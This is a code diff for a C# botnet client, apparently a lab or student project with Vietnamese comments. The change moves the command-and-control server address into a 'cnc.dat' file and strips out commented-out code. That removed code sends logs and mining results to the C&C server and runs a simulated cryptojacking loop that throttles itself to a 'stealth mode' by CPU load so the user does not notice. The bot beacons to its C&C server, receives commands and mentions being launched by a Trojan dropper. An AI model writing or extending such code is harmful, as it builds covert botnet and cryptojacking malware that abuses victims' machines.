@@ -22,18 +22,7 @@ public static class BotCommands
     public const string Recon = "recon";
     public const string ReconDone = "recon_done";
 }
-//public class CryptoJackResult
-//{
-//    public string BotId { get; set; }
-//    public long Nonce { get; set; }
-//    public string Hash { get; set; }
-//}
-//public class LogRequest
-//{
-//    public string BotId { get; set; }
-//    public string Message { get; set; }
-//}
-// Các class Model gửi đi (không còn chứa BotId)
+
 public class BotInfoPayload { public string Status { get; set; } }
 public class LogPayload { public string Message { get; set; } }
 public class ResultPayload { public long Nonce { get; set; } public string Hash { get; set; } }
@@ -47,6 +36,7 @@ public class ReconPayload
 public class Bot
 {
     private static string CncServerUrl;
+    private const string ConfigFileName = "cnc.dat";
     private static readonly HttpClient client = new HttpClient();
     //private static string botId = Guid.NewGuid().ToString();
     private static string currentStatus = BotCommands.Idle;
@@ -81,21 +71,38 @@ public class Bot
         }
         FileLogger.Initialize();
 
-        if (args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
+        string serverIp = string.Empty;
+        string configPath = Path.Combine(AppContext.BaseDirectory, ConfigFileName);
+
+        if (File.Exists(configPath))
         {
-            string serverIp = args[0];
-            CncServerUrl = $"http://{serverIp}:8000"; // Gán giá trị cho CncServerUrl
-            Console.WriteLine($"C&C Server IP received from dropper: {CncServerUrl}");
+            try
+            {
+                serverIp = File.ReadAllText(configPath).Trim();
+                Console.WriteLine($"[INFO] IP loaded from config file: {serverIp}");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[ERROR] Failed to read config file: {ex.Message}");
+            }
+        }
+        // Fallback: Nếu không có file (ví dụ bạn chạy tay để test), vẫn cho phép nhận qua args
+        else if (args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
+        {
+            serverIp = args[0];
+            Console.WriteLine($"[INFO] IP received from args: {serverIp}");
+        }
+
+        if (!string.IsNullOrEmpty(serverIp))
+        {
+            CncServerUrl = $"http://{serverIp}:8000";
         }
         else
         {
             Console.ForegroundColor = ConsoleColor.Red;
-            Console.WriteLine("FATAL: C&C Server IP was not provided.");
-            Console.WriteLine("This bot must be started by the Trojan dropper to function.");
-            Console.ResetColor();
-            Console.ReadLine(); // Dừng chương trình lại để người dùng đọc lỗi
+            Console.WriteLine("FATAL: C&C IP not found (no cnc.dat and no args).");
             FileLogger.Shutdown();
-            return; // Thoát chương trình
+            return;
         }
 
         //Console.WriteLine($"Bot started with ID: {botId}");
@@ -243,21 +250,6 @@ public class Bot
         return true;
     }
     
-    //static async Task SendLogToServerAsync(string message)
-    //{
-    //    try
-    //    {
-    //        var logRequest = new LogRequest { BotId = botId, Message = message };
-    //        var content = new StringContent(JsonSerializer.Serialize(logRequest), Encoding.UTF8, "application/json");
-    //        // Gửi và không cần chờ phản hồi để tránh làm chậm bot
-    //        _ = client.PostAsync($"{CncServerUrl}/bot/log", content);
-    //    }
-    //    catch
-    //    {
-    //        // Bỏ qua lỗi, vì log không quan trọng bằng việc đào
-    //    }
-    //}
-
     static async Task CheckIn()
     {
         //var botInfo = new { BotId = botId, Status = currentStatus };
@@ -751,33 +743,6 @@ public class Bot
             }
         }
     }
-    //static async Task SendResultToServerAsync(long nonce, string hash)
-    //{
-    //    try
-    //    {
-    //        var result = new CryptoJackResult
-    //        {
-    //            BotId = botId,
-    //            Nonce = nonce,
-    //            Hash = hash
-    //        };
-    //        var content = new StringContent(JsonSerializer.Serialize(result), Encoding.UTF8, "application/json");
-    //        // Tạo một CancellationTokenSource để đặt timeout
-    //        using (var cts = new CancellationTokenSource(TimeSpan.FromSeconds(2))) // Timeout sau 2 giây
-    //        {
-    //            // Gửi yêu cầu với CancellationToken
-    //            await client.PostAsync($"{CncServerUrl}/bot/log", content, cts.Token);
-    //        }
-    //    }
-    //    catch (OperationCanceledException)
-    //    {
-    //        // Lỗi này xảy ra khi timeout, đây là điều mong muốn. Bỏ qua.
-    //    }
-    //    catch
-    //    {
-    //        // Bỏ qua các lỗi mạng khác để bot không bị crash
-    //    }
-    //}
     static async Task SendLogToServerAsync(string message)
     {
         try
@@ -803,104 +768,6 @@ public class Bot
         catch { }
     }
 
-    //static Task SimulateCryptoJack(CancellationToken cancellationToken)
-    //{
-    //    return Task.Run(async () =>
-    //    {
-    //        // Biến này sẽ được chia sẻ giữa bộ cảm biến và vòng lặp chính
-    //        int adaptiveHashesPerBurst = 10000; // Mặc định ở mức cân bằng
-
-    //        var cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
-    //        cpuCounter.NextValue();
-
-    //        _ = Task.Run(async () =>
-    //        {
-    //            while (!cancellationToken.IsCancellationRequested)
-    //            {
-    //                float totalSystemCpuUsage = cpuCounter.NextValue();
-
-    //                // === LOGIC THÍCH ỨNG MỚI ===
-    //                if (totalSystemCpuUsage > 40.0f)
-    //                {
-    //                    // HỆ THỐNG BẬN -> LÀM VIỆC VỚI LÔ LỚN
-    //                    adaptiveHashesPerBurst = 100000;
-    //                    Console.WriteLine($"[ADAPTIVE] System CPU HIGH -> Aggressive Mode (Burst: {adaptiveHashesPerBurst})");
-    //                }
-    //                else
-    //                {
-    //                    // HỆ THỐNG RẢNH -> LÀM VIỆC VỚI LÔ NHỎ
-    //                    adaptiveHashesPerBurst = 10000; // Tính 500 hash trước khi nghỉ
-    //                    Console.WriteLine($"[ADAPTIVE] System CPU LOW -> Stealth Mode (Burst: {adaptiveHashesPerBurst})");
-    //                }
-    //                await Task.Delay(3000, cancellationToken);
-    //            }
-    //        }, cancellationToken);
-
-    //        // === LOGIC ĐÀO LIÊN TỤC & LÀM VIỆC THEO LÔ ===
-    //        try
-    //        {
-    //            using (SHA256 sha256 = SHA256.Create())
-    //            {
-    //                int taskNumber = 1;
-    //                await SendLogToServerAsync("Starting PERSISTENT & ADAPTIVE mining task (Batch-based)...");
-
-    //                while (!cancellationToken.IsCancellationRequested)
-    //                {
-    //                    long nonce = 0;
-    //                    int burstCounter = 0;
-    //                    string mode = adaptiveHashesPerBurst > 50000 ? "AGGRESSIVE" : "STEALTH";
-    //                    await SendLogToServerAsync($"[TASK #{taskNumber}] Starting search... Mode: {mode}");
-
-    //                    while (!cancellationToken.IsCancellationRequested)
-    //                    {
-    //                        // === PHẦN BỊ THIẾU TRƯỚC ĐÂY ===
-    //                        // 1. Dữ liệu để hash
-    //                        string dataToHash = $"BalancedTask-{taskNumber}-{nonce}";
-    //                        byte[] bytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(dataToHash));
-
-    //                        // 2. Chuyển đổi byte array thành chuỗi hex và khai báo 'hashString'
-    //                        var sBuilder = new StringBuilder();
-    //                        for (int i = 0; i < bytes.Length; i++) { sBuilder.Append(bytes[i].ToString("x2")); }
-    //                        string hashString = sBuilder.ToString();
-    //                        // ===================================
-
-    //                        // Bây giờ, 'hashString' đã tồn tại và có thể sử dụng được
-    //                        if (hashString.StartsWith("000000"))
-    //                        {
-    //                            await SendLogToServerAsync($"!!! [TASK #{taskNumber}] Hash FOUND! Nonce: {nonce}");
-    //                            await SendResultToServerAsync(nonce, hashString);
-    //                            taskNumber++;
-    //                            break;
-    //                        }
-    //                        nonce++;
-    //                        burstCounter++;
-
-    //                        if (burstCounter >= adaptiveHashesPerBurst)
-    //                        {
-    //                            await Task.Delay(20, cancellationToken);
-    //                            burstCounter = 0;
-    //                        }
-    //                    }
-    //                }
-    //            }
-    //        }
-    //        catch (OperationCanceledException)
-    //        {
-    //            // Chỉ log khi tác vụ bị hủy bởi lệnh từ server
-    //            Console.WriteLine("Persistent mining task was canceled by C&C server.");
-    //        }
-    //        catch (Exception ex)
-    //        {
-    //            Console.WriteLine($"FATAL ERROR in background task: {ex.Message}");
-    //        }
-    //        finally
-    //        {
-    //            // Chỉ khi tác vụ bị hủy thì bot mới quay về idle
-    //            currentStatus = BotCommands.Idle;
-    //            Console.WriteLine("Task stopped. Returning to idle.");
-    //        }
-    //    }, cancellationToken);
-    //}
     static Task SimulateCryptoJack(CancellationToken cancellationToken)
     {
         return Task.Run(async () =>
